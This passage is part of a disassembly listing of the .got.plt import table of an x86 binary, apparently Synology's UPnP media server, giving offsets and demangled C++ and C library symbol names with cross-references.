const*)r\n.got.plt:080BA2C8                                         ; MediaServer::MediaDB::FetchFieldAsInt(char  const*)\n.got.plt:080BA2CC off_80BA2CC     dd offset ixmlNodeList_length\n.got.plt:080BA2CC                                         ; DATA XREF: _ixmlNodeList_lengthr\n.got.plt:080BA2D0 off_80BA2D0     dd offset _ZN11MediaServer25GetMACAddressFromARPTableERKSs\n.got.plt:080BA2D0                                         ; DATA XREF: MediaServer::GetMACAddressFromARPTable(std::string  const&)r\n.got.plt:080BA2D0                                         ; MediaServer::GetMACAddressFromARPTable(std::string  const&)\n.got.plt:080BA2D4 off_80BA2D4     dd offset unlink        ; DATA XREF: _unlinkr\n.got.plt:080BA2D8 off_80BA2D8     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEE4openEPKcSt13_Ios_Openmode\n.got.plt:080BA2D8                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::open(char  const*,std::_Ios_Openmode)r\n.got.plt:080BA2D8                                         ; std::basic_filebuf<char,std::char_traits<char>>::open(char  const*,std::_Ios_Openmode)\n.got.plt:080BA2DC off_80BA2DC     dd offset _ZSt17__throw_bad_allocv\n.got.plt:080BA2DC                                         ; DATA XREF: std::__throw_bad_alloc(void)r\n.got.plt:080BA2DC                                         ; std::__throw_bad_alloc(void)\n.got.plt:080BA2E0 off_80BA2E0     dd offset open64        ; DATA XREF: _open64r\n.got.plt:080BA2E4 off_80BA2E4     dd offset _ZN11MediaServer13DMSClientList10UpdateKeysERKSsS2_S2_RKSt3mapISsSsSt4lessISsESaISt4pairIS1_SsEEE\n.got.plt:080BA2E4                                         ; DATA XREF: MediaServer::DMSClientList::UpdateKeys(std::string  const&,std::string  const&,std::string  const&,std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>>  const&)r\n.got.plt:080BA2E4                                         ; MediaServer::DMSClientList::UpdateKeys(std::string  const&,std::string  const&,std::string  const&,std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>>  const&)\n.got.plt:080BA2E8 off_80BA2E8     dd offset _ZNK7pcrecpp2RE12PartialMatchERKNS_11StringPieceERKNS_3ArgES6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_S6_\n.got.plt:080BA2E8                                         ; DATA XREF: pcrecpp::RE::PartialMatch(pcrecpp::StringPiece  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&)r\n.got.plt:080BA2E8                                         ; pcrecpp::RE::PartialMatch(pcrecpp::StringPiece  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&,pcrecpp::Arg  const&)\n.got.plt:080BA2EC off_80BA2EC     dd offset strerror      ; DATA XREF: _strerrorr\n.got.plt:080BA2F0 off_80BA2F0     dd offset pthread_cancel ; DATA XREF: _pthread_cancelr\n.got.plt:080BA2F4 off_80BA2F4     dd offset _ZN11MediaServer11DMSLogCloseEv\n.got.plt:080BA2F4                                         ; DATA XREF: sub_8084BDC:MediaServer::DMSLogClose(void)r\n.got.plt:080BA2F4                                         ; MediaServer::DMSLogClose(void)\n.got.plt:080BA2F8 off_80BA2F8     dd offset _ZN14SynoAudioUtils17SmartPLSListSongsEiiiRiRSt4listI21__tag_SYNO_MEDIA_INFOSaIS2_EEb\n.got.plt:080BA2F8                                         ; DATA XREF: SynoAudioUtils::SmartPLSListSongs(int,int,int,int &,std::list<__tag_SYNO_MEDIA_INFO,std::allocator<__tag_SYNO_MEDIA_INFO>> &,bool)r\n.got.plt:080BA2F8                                         ; SynoAudioUtils::SmartPLSListSongs(int,int,int,int &,std::list<__tag_SYNO_MEDIA_INFO,std::allocator<__tag_SYNO_MEDIA_INFO>> &,bool)\n.got.plt:080BA2FC off_80BA2FC     dd offset termPQExpBuffer ; DATA XREF: _termPQExpBufferr\n.got.plt:080BA300 off_80BA300     dd offset dirname       ; DATA XREF: _dirnamer\n.got.plt:080BA304 off_80BA304     dd offset _ZNKSs7compareEPKc\n.got.plt:080BA304                                         ; DATA XREF: std::string::compare(char  const*)r\n.got.plt:080BA304                                         ; std::string::compare(char  const*)\n.got.plt:080BA308 off_80BA308     dd offset __cxa_atexit  ; DATA XREF: ___cxa_atexitr\n.got.plt:080BA30C off_80BA30C     dd offset __errno_location ; DATA XREF: ___errno_locationr\n.got.plt:080BA310 off_80BA310     dd offset _ZN11MediaServer13DMSClientListC1Ev\n.got.plt:080BA310                                         ; DATA XREF: MediaServer::DMSClientList::DMSClientList(void)r\n.got.plt:080BA310                                         ; MediaServer::DMSClientList::DMSClientList(void)\n.got.plt:080BA314 off_80BA314     dd offset MediaInfoDBClose ; DATA XREF: _MediaInfoDBCloser\n.got.plt:080BA318 off_80BA318     dd offset _ZN14SynoAudioUtils16SmartPLSGetCountEv\n.got.plt:080BA318                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetCount(void)r\n.got.plt:080BA318                                         ; SynoAudioUtils::SmartPLSGetCount(void)\n.got.plt:080BA31C off_80BA31C     dd offset _ZN11MediaServer17DMSFormatUPNPDateEPKc\n.got.plt:080BA31C                                         ; DATA XREF: MediaServer::DMSFormatUPNPDate(char  const*)r\n.got.plt:080BA31C                                         ; MediaServer::DMSFormatUPNPDate(char  const*)\n.got.plt:080BA320 off_80BA320     dd offset _ZN14SynoAudioUtils20SmartPLSGetSongCountEib\n.got.plt:080BA320                                         ; DATA XREF: SynoAudioUtils::SmartPLSGetSongCount(int,bool)r\n.got.plt:080BA320                                         ; SynoAudioUtils::SmartPLSGetSongCount(int,bool)\n.got.plt:080BA324 off_80BA324     dd offset _ZSt28_Rb_tree_rebalance_for_erasePSt18_Rb_tree_node_baseRS_\n.got.plt:080BA324                                         ; DATA XREF: std::_Rb_tree_rebalance_for_erase(std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)r\n.got.plt:080BA324                                         ; std::_Rb_tree_rebalance_for_erase(std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)\n.got.plt:080BA328 off_80BA328     dd offset access        ; DATA XREF: _accessr\n.got.plt:080BA32C off_80BA32C     dd offset ixmlDocument_free\n.got.plt:080BA32C                                         ; DATA XREF: _ixmlDocument_freer\n.got.plt:080BA330 off_80BA330     dd offset ixmlPrintDocument\n.got.plt:080BA330                                         ; DATA XREF: _ixmlPrintDocumentr\n.got.plt:080BA334 off_80BA334     dd offset ixmlNode_getAttributes\n.got.plt:080BA334                                         ; DATA XREF: _ixmlNode_getAttributesr\n.got.plt:080BA338 off_80BA338     dd offset inet_ntoa     ; DATA XREF: _inet_ntoar\n.got.plt:080BA33C off_80BA33C     dd offset _ZNSt13basic_filebufIcSt11char_traitsIcEEC1Ev\n.got.plt:080BA33C                                         ; DATA XREF: std::basic_filebuf<char,std::char_traits<char>>::basic_filebuf(void)r\n.got.plt:080BA33C                                         ; std::basic_filebuf<char,std::char_traits<char>>::basic_filebuf(void)\n.got.plt:080BA340 off_80BA340     dd offset ixmlNode_getChildNodes\n.got.plt:080BA340                                         ; DATA XREF: _ixmlNode_getChildNodesr\n.got.plt:080BA344 off_80BA344     dd offset _ZN11MediaServer15XMLEnumElementsEP10_IXML_NodeRKSs\n.got.plt:080BA344                                         ; DATA XREF: MediaServer::XMLEnumElements(_IXML_Node *,std::string  const&)r\n.got.plt:080BA344                                         ; MediaServer::XMLEnumElements(_IXML_Node *,std::string  const&)\n.got.plt:080BA348 off_80BA348     dd offset _ZNSs7reserveEj\n.got.plt:080BA348                                         ; DATA XREF: std::string::reserve(uint)r\n.got.plt:080BA348                                         ; std::string::reserve(uint)\n.got.plt:080BA34C off_80BA34C     dd offset pcre_get_substring_list\n.got.plt:080BA34C                                         ; DATA XREF: _pcre_get_substring_listr\n.got.plt:080BA350 off_80BA350     dd offset _ZNKSs4findEPKcjj\n.got.plt:080BA350                                         ; DATA XREF: std::string::find(char  const*,uint,uint)r\n.got.plt:080BA350                                         ; std::string::find(char  const*,uint,uint)\n.got.plt:080BA354 off_80BA354     dd offset malloc        ; DATA XREF: _mallocr\n.got.plt:080BA358 off_80BA358     dd offset ixmlCloneDOMString\n.got.plt:080BA358                                         ; DATA XREF: _ixmlCloneDOMStringr\n.got.plt:080BA35C off_80BA35C     dd offset pthread_mutex_init\n.got.plt:080BA35C                                         ; DATA XREF: _pthread_mutex_initr\n.got.plt:080BA360 off_80BA360     dd offset fscanf        ; DATA XREF: _fscanfr\n.got.plt:080BA364 off_80BA364     dd offset _ZNSsC1ERKSsjj\n.got.plt:080BA364                                         ; DATA XREF: std::string::string(std::string  const&,uint,uint)r\n.got.plt:080BA364                                         ; std::string::string(std::string  const&,uint,uint)\n.got.plt:080BA368 off_80BA368     dd offset SLIBCFileGetKeyValue\n.got.plt:080BA368                                         ; DATA XREF: _SLIBCFileGetKeyValuer\n.got.plt:080BA36C off_80BA36C     dd offset fread         ; DATA XREF: _freadr\n.got.plt:080BA370 off_80BA370     dd offset memmove       ; DATA XREF: _memmover\n.got.plt:080BA374 off_80BA374     dd offset _ZN11MediaServer23XMLGetFirstDocumentItemEP14_IXML_DocumentPKcPb\n.got.plt:080BA374                                         ; DATA XREF: MediaServer::XMLGetFirstDocumentItem(_IXML_Document *,char  const*,bool *)r\n.got.plt:080BA374                                         ; MediaServer::XMLGetFirstDocumentItem(_IXML_Document *,char  const*,bool *)\n.got.plt:080BA378 off_80BA378     dd offset _ZN11MediaServer16DMSClientChecker13GetOffendCharEv\n.got.plt:080BA378                                         ; DATA XREF: MediaServer::DMSClientChecker::GetOffendChar(void)r\n.got.plt:080BA378                                         ; MediaServer::DMSClientChecker::GetOffendChar(void)\n.got.plt:080BA37C off_80BA37C     dd offset _ZN11MediaServer13StringExplodeERKSsS1_\n.got.plt:080BA37C                                         ; DATA XREF: MediaServer::StringExplode(std::string  const&,std::string  const&)r\n.got.plt:080BA37C                                         ; MediaServer::StringExplode(std::string  const&,std::string  const&)\n.got.plt:080BA380 off_80BA380     dd offset _ZNSt12__basic_fileIcED1Ev\n.got.plt:080BA380                                         ; DATA XREF: std::__basic_file<char>::~__basic_file()r\n.got.plt:080BA380                                         ; std::__basic_file<char>::~__basic_file()\n.got.plt:080BA384 off_80BA384     dd offset syslog        ; DATA XREF: _syslogr\n.got.plt:080BA388 off_80BA388     dd offset daemon        ; DATA XREF: _daemonr\n.got.plt:080BA38C off_80BA38C     dd offset ixmlNamedNodeMap_free\n.got.plt:080BA38C                                         ; DATA XREF: _ixmlNamedNodeMap_freer\n.got.plt:080BA390 off_80BA390     dd offset _ZNSs6appendERKSs\n.got.plt:080BA390                                         ; DATA XREF: std::string::append(std::string  const&)r\n.got.plt:080BA390                                         ; std::string::append(std::string  const&)\n.got.plt:080BA394 off_80BA394     dd offset _ZN11MediaServer12GetCoverListERSt6vectorISsSaISsEE\n.got.plt:080BA394                                         ; DATA XREF: MediaServer::GetCoverList(std::vector<std::string,std::allocator<std::string>> &)r\n.got.plt:080BA394                                         ; MediaServer::GetCoverList(std::vector<std::string,std::allocator<std::string>> &)\n.got.plt:080BA398 off_80BA398     dd offset UpnpAddToActionResponse\n.got.plt:080BA398                                         ; DATA XREF: _UpnpAddToActionResponser\n.got.plt:080BA39C off_80BA39C     dd offset _ZN11MediaServer14DMSLOGSetLevelENS_12DMSLOG_LEVELE\n.got.plt:080BA39C                                         ; DATA XREF: MediaServer::DMSLOGSetLevel(MediaServer::DMSLOG_LEVEL)r\n.got.plt:080BA39C                                         ; MediaServer::DMSLOGSetLevel(MediaServer::DMSLOG_LEVEL)\n.got.plt:080BA3A0 off_80BA3A0     dd offset _ZN11MediaServer7MediaDB7NextRowEv\n.got.plt:080BA3A0                                         ; DATA XREF: MediaServer::MediaDB::NextRow(void)r\n.got.plt:080BA3A0                                         ; MediaServer::MediaDB::NextRow(void)\n.got.plt:080BA3A4 off_80BA3A4     dd offset _ZNSsD1Ev     ; DATA XREF: std::string::~string()r\n.got.plt:080BA3A4                                         ; std::string::~string()\n.got.plt:080BA3A8 off_80BA3A8     dd offset _ZN11MediaServer16DMSClientChecker19getVideoProfileNameEPK21__tag_SYNO_MEDIA_INFO\n.got.plt:080BA3A8                                         ; DATA XREF: MediaServer::DMSClientChecker::getVideoProfileName(__tag_SYNO_MEDIA_INFO  const*)r\n.got.plt:080BA3A8                                         ; MediaServer::DMSClientChecker::getVideoProfileName(__tag_SYNO_MEDIA_INFO  const*)\n.got.plt:080BA3AC off_80BA3AC     dd offset __cxa_allocate_exception\n.got.plt:080BA3AC                                         ; DATA XREF: ___cxa_allocate_exceptionr\n.got.plt:080BA3B0 off_80BA3B0     dd offset UpnpNotify    ; DATA XREF: _UpnpNotifyr\n.got.plt:080BA3B4 off_80BA3B4     dd offset _ZN11MediaServer24FileGetPathBaseNameNoExtERKSs\n.got.plt:080BA3B4                                         ; DATA XREF: MediaServer::FileGetPathBaseNameNoExt(std::string  const&)r\n.got.plt:080BA3B4                                         ; MediaServer::FileGetPathBaseNameNoExt(std::string  const&)\n.got.plt:080BA3B8 off_80BA3B8     dd offset _ZN11MediaServer21DMSFormatUPNPDurationEi\n.got.plt:080BA3B8                                         ; DATA XREF: MediaServer::DMSFormatUPNPDuration(int)r\n.got.plt:080BA3B8                                         ; MediaServer::DMSFormatUPNPDuration(int)\n.got.plt:080BA3BC off_80BA3BC     dd offset _ZN4Json5ValueC1Ei\n.got.plt:080BA3BC                                         ; DATA XREF: Json::Value::Value(int)r\n.got.plt:080BA3BC                                         ; Json::Value::Value(int)\n.got.plt:080BA3C0 off_80BA3C0     dd offset ixmlNode_getNodeValue\n.got.plt:080BA3C0                                         ; DATA XREF: _ixmlNode_getNodeValuer\n.got.plt:080BA3C4 off_80BA3C4     dd offset _ZN11MediaServer18DMSGetProductModelEv\n.got.plt:080BA3C4                                         ; DATA XREF: MediaServer::DMSGetProductModel(void)r\n.got.plt:080BA3C4                                         ; MediaServer::DMSGetProductModel(void)\n.got.plt:080BA3C8 off_80BA3C8     dd offset time          ; DATA XREF: _timer\n.got.plt:080BA3CC off_80BA3CC     dd offset BlSYNOIndexIsRawImage\n.got.plt:080BA3CC                                         ; DATA XREF: _BlSYNOIndexIsRawImager\n.got.plt:080BA3D0 off_80BA3D0     dd offset _ZN11MediaServer15DMSStringBundle13ImportStringsEv\n.got.plt:080BA3D0                                         ; DATA XREF: MediaServer::DMSStringBundle::ImportStrings(void)r\n.got.plt:080BA3D0                                         ; MediaServer::DMSStringBundle::ImportStrings(void)\n.got.plt:080BA3D4 off_80BA3D4     dd offset ixmlNodeList_item\n.got.plt:080BA3D4                                         ; DATA XREF: _ixmlNodeList_itemr\n.got.plt:080BA3D8 off_80BA3D8     dd offset pthread_mutex_lock\n.got.plt:080BA3D8                                         ; DATA XREF: _pthread_mutex_lockr\n.got.plt:080BA3DC off_80BA3DC     dd offset _ZN11MediaServer18FileGetPathDirNameERKSs\n.got.plt:080BA3DC                                         ; DATA XREF: MediaServer::FileGetPathDirName(std::string  const&)r\n.got.plt:080BA3DC                                         ; MediaServer::FileGetPathDirName(std::string  const&)\n.got.plt:080BA3E0 off_80BA3E0     dd offset UpnpFinish    ; DATA XREF: _UpnpFinishr\n.got.plt:080BA3E4 off_80BA3E4     dd offset _ZNSs4_Rep10_M_destroyERKSaIcE\n.got.plt:080BA3E4                                         ; DATA XREF: std::string::_Rep::_M_destroy(std::allocator<char>  const&)r\n.got.plt:080BA3E4                                         ; std::string::_Rep::_M_destroy(std::allocator<char>  const&)\n.got.plt:080BA3E8 off_80BA3E8     dd offset _ZN14SynoAudioUtils9RadioInitEv\n.got.plt:080BA3E8                                         ; DATA XREF: SynoAudioUtils::RadioInit(void)r\n.got.plt:080BA3E8                                         ; SynoAudioUtils::RadioInit(void)\n.got.plt:080BA3EC off_80BA3EC     dd offset ixmlNode_getNodeName\n.got.plt:080BA3EC                                         ; DATA XREF: _ixmlNode_getNodeNamer\n.got.plt:080BA3F0 off_80BA3F0     dd offset _ZN11MediaServer22DMSGetNetworkInterfaceERSt3mapISsSsSt4lessISsESaISt4pairIKSsSsEEE\n.got.plt:080BA3F0                                         ; DATA XREF: MediaServer::DMSGetNetworkInterface(std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>> &)r\n.got.plt:080BA3F0                                         ; MediaServer::DMSGetNetworkInterface(std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>> &)\n.got.plt:080BA3F4 off_80BA3F4     dd offset strstr        ; DATA XREF: _strstrr\n.got.plt:080BA3F8 off_80BA3F8     dd offset sleep         ; DATA XREF: _sleepr\n.got.plt:080BA3FC off_80BA3FC     dd offset _ZN11MediaServer9XMLEscapeERKSsPKc\n.got.plt:080BA3FC                                         ; DATA XREF: MediaServer::XMLEscape(std::string  const&,char  const*)r\n.got.plt:080BA3FC                                         ; MediaServer::XMLEscape(std::string  const&,char  const*)\n.got.plt:080BA400 off_80BA400     dd offset MediaInfoDBOpen ; DATA XREF: _MediaInfoDBOpenr\n.got.plt:080BA404 off_80BA404     dd offset __strtol_internal\n.got.plt:080BA404                                         ; DATA XREF: ___strtol_internalr\n.got.plt:080BA408 off_80BA408     dd offset pthread_setspecific\n.got.plt:080BA408                                         ; DATA XREF: _pthread_setspecificr\n.got.plt:080BA40C off_80BA40C     dd offset pthread_key_create\n.got.plt:080BA40C                                         ; DATA XREF: _pthread_key_creater\n.got.plt:080BA410 off_80BA410     dd offset _ZNSsC1ERKSs  ; DATA XREF: std::string::string(std::string  const&)r\n.got.plt:080BA410                                         ; std::string::string(std::string  const&)\n.got.plt:080BA414 off_80BA414     dd offset UpnpAcceptSubscription\n.got.plt:080BA414                                         ; DATA XREF: _UpnpAcceptSubscriptionr\n.got.plt:080BA418 off_80BA418     dd offset __cxa_begin_catch\n.got.plt:080BA418                                         ; DATA XREF: ___cxa_begin_catchr\n.got.plt:080BA41C off_80BA41C     dd offset _ZN11MediaServer13DMSClientList11FindMacByIPERKSs\n.got.plt:080BA41C                                         ; DATA XREF: MediaServer::DMSClientList::FindMacByIP(std::string  const&)r\n.got.plt:080BA41C                                         ; MediaServer::DMSClientList::FindMacByIP(std::string  const&)\n.got.plt:080BA420 off_80BA420     dd offset _Znaj         ; DATA XREF: operator new[](uint)r\n.got.plt:080BA420                                         ; operator new[](uint)\n.got.plt:080BA424 off_80BA424     dd offset _ZN14SynoAudioUtils19RadioGetStationDataEjjRNS_12RadioStationE\n.got.plt:080BA424                                         ; DATA XREF: SynoAudioUtils::RadioGetStationData(uint,uint,SynoAudioUtils::RadioStation &)r\n.got.plt:080BA424                                         ; SynoAudioUtils::RadioGetStationData(uint,uint,SynoAudioUtils::RadioStation &)\n.got.plt:080BA428 off_80BA428     dd offset __xstat64     ; DATA XREF: ___xstat64r\n.got.plt:080BA42C off_80BA42C     dd offset _ZSt18_Rb_tree_decrementPSt18_Rb_tree_node_base\n.got.plt:080BA42C                                         ; DATA XREF: std::_Rb_tree_decrement(std::_Rb_tree_node_base *)r\n.got.plt:080BA42C                                         ; std::_Rb_tree_decrement(std::_Rb_tree_node_base *)\n.got.plt:080BA430 off_80BA430     dd offset _ZNSsC1EPKcRKSaIcE\n.got.plt:080BA430                                         ; DATA XREF: std::string::string(char  const*,std::allocator<char>  const&)r\n.got.plt:080BA430                                         ; std::string::string(char  const*,std::allocator<char>  const&)\n.got.plt:080BA434 off_80BA434     dd offset initPQExpBuffer ; DATA XREF: _initPQExpBufferr\n.got.plt:080BA438 off_80BA438     dd offset pcre_compile  ; DATA XREF: _pcre_compiler\n.got.plt:080BA43C off_80BA43C     dd offset _ZN11MediaServer14DMSLOGGetLevelEv\n.got.plt:080BA43C                                         ; DATA XREF: MediaServer::DMSLOGGetLevel(void)r\n.got.plt:080BA43C                                         ; MediaServer::DMSLOGGetLevel(void)\n.got.plt:080BA440 off_80BA440     dd offset SYNODBConnect ; DATA XREF: _SYNODBConnectr\n.got.plt:080BA444 off_80BA444     dd offset _ZN11MediaServer16DMSClientCheckerC1ERKSsS2_b\n.got.plt:080BA444                                         ; DATA XREF: MediaServer::DMSClientChecker::DMSClientChecker(std::string  const&,std::string  const&,bool)r\n.got.plt:080BA444                                         ; MediaServer::DMSClientChecker::DMSClientChecker(std::string  const&,std::string  const&,bool)\n.got.plt:080BA448 off_80BA448     dd offset _ZN14SynoAudioUtils12SmartPLSEnumEiiRiPKc\n.got.plt:080BA448                                         ; DATA XREF: SynoAudioUtils::SmartPLSEnum(int,int,int &,char  const*)r\n.got.plt:080BA448                                         ; SynoAudioUtils::SmartPLSEnum(int,int,int &,char  const*)\n.got.plt:080BA44C off_80BA44C     dd offset _ZN11MediaServer13StringToLowerERKSs\n.got.plt:080BA44C                                         ; DATA XREF: MediaServer::StringToLower(std::string  const&)r\n.got.plt:080BA44C                                         ; MediaServer::StringToLower(std::string  const&)\n.got.plt:080BA450 off_80BA450     dd offset __libc_start_main\n.got.plt:080BA450                                         ; DATA XREF: ___libc_start_mainr\n.got.plt:080BA454 off_80BA454     dd offset _ZN11MediaServer7MediaDB11SelectTotalEv\n.got.plt:080BA454                                         ; DATA XREF: MediaServer::MediaDB::SelectTotal(void)r\n.got.plt:080BA454                                         ; MediaServer::MediaDB::SelectTotal(void)\n.got.plt:080BA458 off_80BA458     dd offset _ZN11MediaServer21DMSGetMediaFolderPathE21_tag_MEDIA_TABLE_TYPE\n.got.plt:080BA458                                         ; DATA XREF: MediaServer::DMSGetMediaFolderPath(_tag_MEDIA_TABLE_TYPE)r\n.got.plt:080BA458                                         ; MediaServer::DMSGetMediaFolderPath(_tag_MEDIA_TABLE_TYPE)\n.got.plt:080BA45C off_80BA45C     dd offset _ZN11MediaServer13DMSClientList11WriteToFileEv\n.got.plt:080BA45C                                         ; DATA XREF: MediaServer::DMSClientList::WriteToFile(void)r\n.got.plt:080BA45C                                         ; MediaServer::DMSClientList::WriteToFile(void)\n.got.plt:080BA460 off_80BA460     dd offset _ZSt18_Rb_tree_incrementPSt18_Rb_tree_node_base\n.got.plt:080BA460                                         ; DATA XREF: std::_Rb_tree_increment(std::_Rb_tree_node_base *)r\n.got.plt:080BA460                                         ; std::_Rb_tree_increment(std::_Rb_tree_node_base *)\n.got.plt:080BA464 off_80BA464     dd offset _ZNSs14_M_replace_auxEjjjc\n.got.plt:080BA464                                         ; DATA XREF: std::string::_M_replace_aux(uint,uint,uint,char)r\n.got.plt:080BA464                                         ; std::string::_M_replace_aux(uint,uint,uint,char)\n.got.plt:080BA468 off_80BA468     dd offset _ZN11MediaServer20XMLGetAttributeValueEP10_IXML_NodeRKSs\n.got.plt:080BA468                                         ; DATA XREF: MediaServer::XMLGetAttributeValue(_IXML_Node *,std::string  const&)r\n.got.plt:080BA468                                         ; MediaServer::XMLGetAttributeValue(_IXML_Node *,std::string  const&)\n.got.plt:080BA46C off_80BA46C     dd offset _ZNSs6appendEPKcj\n.got.plt:080BA46C                                         ; DATA XREF: std::string::append(char  const*,uint)r\n.got.plt:080BA46C                                         ; std::string::append(char  const*,uint)\n.got.plt:080BA470 off_80BA470     dd offset _Znwj         ; DATA XREF: operator new(uint)r\n.got.plt:080BA470                                         ; operator new(uint)\n.got.plt:080BA474 off_80BA474     dd offset UpnpSetWebServerRootDir\n.got.plt:080BA474                                         ; DATA XREF: _UpnpSetWebServerRootDirr\n.got.plt:080BA478 off_80BA478     dd offset _ZN11MediaServer7MediaDBD1Ev\n.got.plt:080BA478                                         ; DATA XREF: MediaServer::MediaDB::~MediaDB()r\n.got.plt:080BA478                                         ; MediaServer::MediaDB::~MediaDB()\n.got.plt:080BA47C off_80BA47C     dd offset SLIBCStrTokIndex ; DATA XREF: _SLIBCStrTokIndexr\n.got.plt:080BA480 off_80BA480     dd offset _ZN11MediaServer19XMLFindChildElementERKSsP10_IXML_Node\n.got.plt:080BA480                                         ; DATA XREF: MediaServer::XMLFindChildElement(std::string  const&,_IXML_Node *)r\n.got.plt:080BA480                                         ; MediaServer::XMLFindChildElement(std::string  const&,_IXML_Node *)\n.got.plt:080BA484 off_80BA484     dd offset _ZNSt8ios_baseD2Ev\n.got.plt:080BA484                                         ; DATA XREF: std::ios_base::~ios_base()r\n.got.plt:080BA484                                         ; std::ios_base::~ios_base()\n.got.plt:080BA488 off_80BA488     dd offset _ZSt29_Rb_tree_insert_and_rebalancebPSt18_Rb_tree_node_baseS0_RS_\n.got.plt:080BA488                                         ; DATA XREF: std::_Rb_tree_insert_and_rebalance(bool,std::_Rb_tree_node_base *,std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)r\n.got.plt:080BA488                                         ; std::_Rb_tree_insert_and_rebalance(bool,std::_Rb_tree_node_base *,std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)\n.got.plt:080BA48C off_80BA48C     dd offset _ZN4Json5ValueaSERKS0_\n.got.plt:080BA48C                                         ; DATA XREF: Json::Value::operator=(Json::Value const&)r\n.got.plt:080BA48C                                         ; Json::Value::operator=(Json::Value const&)\n.got.plt:080BA490 off_80BA490     dd offset _ZN11MediaServer10DMSLOGInitEPKc\n.got.plt:080BA490                                         ; DATA XREF: MediaServer::DMSLOGInit(char  const*)r\n.got.plt:080BA490                                         ; MediaServer::DMSLOGInit(char  const*)\n.got.plt:080BA494 off_80BA494     dd offset MediaInfoDBGet ; DATA XREF: _MediaInfoDBGetr\n.got.plt:080BA498 off_80BA498     dd offset fclose        ; DATA XREF: _fcloser\n.got.plt:080BA49C off_80BA49C     dd offset _ZNSt9basic_iosIcSt11char_traitsIcEE5clearESt12_Ios_Iostate\n.got.plt:080BA49C                                         ; DATA XREF: std::basic_ios<char,std::char_traits<char>>::clear(std::_Ios_Iostate)r\n.got.plt:080BA49C                                         ; std::basic_ios<char,std::char_traits<char>>::clear(std::_Ios_Iostate)\n.got.plt:080BA4A0 off_80BA4A0     dd offset strrchr       ; DATA XREF: _strrchrr\n.got.plt:080BA4A4 off_80BA4A4     dd offset SYNONetGetCard1 ; DATA XREF: _SYNONetGetCard1r\n.got.plt:080BA4A8 off_80BA4A8     dd offset _ZN11MediaServer21GetIndexLoacationPathERK21_tag_MEDIA_TABLE_TYPE\n.got.plt:080BA4A8                                         ; DATA XREF: MediaServer::GetIndexLoacationPath(_tag_MEDIA_TABLE_TYPE  const&)r\n.got.plt:080BA4A8                                         ; MediaServer::GetIndexLoacationPath(_tag_MEDIA_TABLE_TYPE  const&)\n.got.plt:080BA4AC off_80BA4AC     dd offset _ZN11MediaServer9DMSPrintfENS_12DMSLOG_LEVELEPKcz\n.got.plt:080BA4AC                                         ; DATA XREF: MediaServer::DMSPrintf(MediaServer::DMSLOG_LEVEL,char  const*,...)r\n.got.plt:080BA4AC                                         ; MediaServer::DMSPrintf(MediaServer::DMSLOG_LEVEL,char  const*,...)\n.got.plt:080BA4B0 off_80BA4B0     dd offset fopen64       ; DATA XREF: _fopen64r\n.got.plt:080BA4B4 off_80BA4B4     dd offset UpnpGetServerPort\n.got.plt:080BA4B4                                         ; DATA XREF: _UpnpGetServerPortr\n.got.plt:080BA4B8 off_80BA4B8     dd offset _ZN14SynoAudioUtils14RadioGetGenresEiiRSt6vectorINS_10RadioGenreESaIS1_EERi\n.got.plt:080BA4B8                                         ; DATA XREF: SynoAudioUtils::RadioGetGenres(int,int,std::vector<SynoAudioUtils::RadioGenre,std::allocator<SynoAudioUtils::RadioGenre>> &,int &)r\n.got.plt:080BA4B8                                         ; SynoAudioUtils::RadioGetGenres(int,int,std::vector<SynoAudioUtils::RadioGenre,std::allocator<SynoAudioUtils::RadioGenre>> &,int &)\n.got.plt:080BA4BC off_80BA4BC     dd offset _ZN11MediaServer16XMLEnumTagValuesEP10_IXML_NodeRKSs\n.got.plt:080BA4BC                                         ; DATA XREF: MediaServer::XMLEnumTagValues(_IXML_Node *,std::string  const&)r\n.got.plt:080BA4BC                                         ; MediaServer::XMLEnumTagValues(_IXML_Node *,std::string  const&)\n.got.plt:080BA4C0 off_80BA4C0     dd offset snprintf      ; DATA XREF: _snprintfr\n.got.plt:080BA4C4 off_80BA4C4     dd offset gethostname   ; DATA XREF: _gethostnamer\n.got.plt:080BA4C8 off_80BA4C8     dd offset _ZN11MediaServer16DMSClientChecker15InitProfileListERKSs\n.got.plt:080BA4C8                                         ; DATA XREF: MediaServer::DMSClientChecker::InitProfileList(std::string  const&)r\n.got.plt:080BA4C8                                         ; MediaServer::DMSClientChecker::InitProfileList(std::string  const&)\n.got.plt:080BA4CC off_80BA4CC     dd offset __cxa_pure_virtual\n.got.plt:080BA4CC                                         ; DATA XREF: ___cxa_pure_virtualr\n.got.plt:080BA4D0 off_80BA4D0     dd offset strcasecmp    ; DATA XREF: _strcasecmpr\n.got.plt:080BA4D4 off_80BA4D4     dd offset mkstemp64     ; DATA XREF: _mkstemp64r\n.got.plt:080BA4D8 off_80BA4D8     dd offset inet_ntop     ; DATA XREF: _inet_ntopr\n.got.plt:080BA4DC off_80BA4DC     dd offset _ZSt20__throw_length_errorPKc\n.got.plt:080BA4DC                                         ; DATA XREF: std::__throw_length_error(char  const*)r\n.got.plt:080BA4DC                             